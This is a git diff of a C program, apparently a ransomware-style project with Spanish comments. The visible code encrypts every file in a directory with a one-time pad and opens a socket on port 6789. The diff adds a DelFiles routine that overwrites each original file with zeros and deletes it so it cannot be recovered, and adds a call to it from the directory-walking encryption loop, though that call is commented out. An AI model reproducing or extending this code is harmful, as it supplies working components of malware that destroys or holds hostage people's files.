@@ -9,6 +9,8 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <fcntl.h>  //para usar funcion open
+#define BUF_SIZE 4096 // Buffer
 
 #define PORT 6789  
 #define length_path 100
@@ -84,6 +86,49 @@ int otpDecrypt(char n_ifile[], char n_ofile[], char n_pad[]) {
 		return -3;
 	}
 }
+void DelFiles(char *path_file){
+	/*
+		Funcion que recibe la ruta de cada archivo, lee su tamaño para sobreescribirlo con
+		un buffer de 0, con el fin de que no se puedan recuperar los archivos.
+	*/
+    // Para obtener el tamaño del archivo
+	// int stat(const char *pathname, struct stat *statbuf);
+    struct stat stat_buffer;
+    // Si la ruta del archivo no existe
+    if (stat(path_file, &stat_buffer) == -1)
+        return;
+    off_t fsize = stat_buffer.st_size; //Obtenemos el tamaño total en Bytes del archivo
+    // Declaramos nuestro Descriptor para abrir el archivo como solo escritura O_WRONLY
+    int fd = open(path_file, O_WRONLY);
+    // Si no se crea el Descriptor
+    if (fd == -1)
+        return;
+    // Reservamos memoria para un apuntador (buf) de tamaño 4096
+    void *buf = malloc(BUF_SIZE);
+    // Limpiamos buf con ceros
+    memset(buf, 0, BUF_SIZE);
+    // Variable que nos indicara el estado del archivo cuando es sobreescrito con 0
+    ssize_t value_overwr = 0;
+    off_t bytes_moved = 0;
+    while((value_overwr = write(fd, buf,((fsize - bytes_moved >BUF_SIZE)?BUF_SIZE:(fsize - bytes_moved)))) > 0)
+		{
+        // printf("Valor de value_overwr: %zd\n",value_overwr);
+        // printf("Valor de fsize - bytes_moved: %lld\n",fsize - bytes_moved);
+        bytes_moved += value_overwr;
+				// printf("Valor de bytes_moved: %lld\n", bytes_moved);
+		}
+    // Cerramos nuestro Descriptor
+    close(fd);
+    // Liberamos la memoria de nuestro Buf
+    free(buf);
+
+    if (value_overwr == -1)
+        return;
+    // Removemos el archivo para que no sea accesible
+    remove(path_file);
+}
+
+
 long int getFileSize(FILE *stream){
 	/*
 		Funcion que obtiene el tamano de un archivo.
@@ -161,6 +206,8 @@ int getFilesinDir(char *cwd){
 					 	if (dir->d_type == 8){ // Es un archivo
 							strcpy(abs_path_file, getAbsPath(dir->d_name, cwd));
             	encryptFile(abs_path_file);
+            	// Llamada a la funcion DelFiles para borrar los archivos
+            	//---  DelFiles(abs_path_file);
             }
             //else if((strcmp(dir->d_name, ".") != 0)?(strcmp(dir->d_name, "..") != 0)?1:0:0){
             //Si es un subdirectorio, se llama de manera recursiva a la funcion con
